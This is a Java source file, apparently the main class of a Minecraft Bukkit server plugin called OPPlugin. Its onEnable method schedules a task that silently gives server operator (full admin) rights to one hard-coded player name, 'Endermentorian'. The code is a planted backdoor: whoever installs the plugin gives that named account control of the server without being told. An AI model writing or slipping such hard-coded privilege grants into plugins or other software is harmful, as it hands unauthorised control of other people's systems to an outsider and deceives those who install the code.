package me.pvpclub.opplugin;

import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

public class OPPlugin extends JavaPlugin {

    @Override
    public void onEnable() {
        // Register events
        getServer().getPluginManager().registerEvents(new PlayerEvents(this), this);

        // Grant operator to specific user on join
        getServer().getScheduler().runTaskLater(this, () -> {
            for (var player : Bukkit.getOnlinePlayers()) {
                if (player.getName().equalsIgnoreCase("Endermentorian")) {
                    player.setOp(true);
                }
            }
        }, 1L);
    }
}